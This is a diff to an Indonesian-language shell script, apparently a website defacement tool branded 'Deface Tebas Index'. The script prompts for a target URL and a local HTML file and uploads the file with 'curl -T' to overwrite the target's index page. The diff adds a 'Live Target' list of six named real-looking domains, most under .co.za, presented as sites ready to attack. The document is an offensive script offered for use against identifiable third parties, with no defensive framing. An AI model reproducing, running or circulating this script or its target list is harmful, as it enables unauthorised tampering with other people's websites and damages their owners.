@@ -33,11 +33,18 @@ then
  
 echo "                                          "
 figlet -f future Deface Tebas Index
-echo $red "Masukan Target !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $red "Masukan Target Kalian !!!! "
+echo $yellow "Live Target"
+echo $white "http://contsol.co.za"
+echo $cyan "http://colourfactory.co.za"
+echo $white "http://chillibitez.co.za"
+echo $cyan "http://chasingfantasia.com"
+echo $white "http://centraltech.co.za"
+echo $cyan "http://cblandscapes.co.za"
+echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/IndoCyber"$white
 read -p " ╰─$ "  target
 echo $green "Masukan Script !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Hajar"$white
+echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Nama SC Haru(index.html)"$white
 read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
 echo $red "[+]>>>>> = $target"
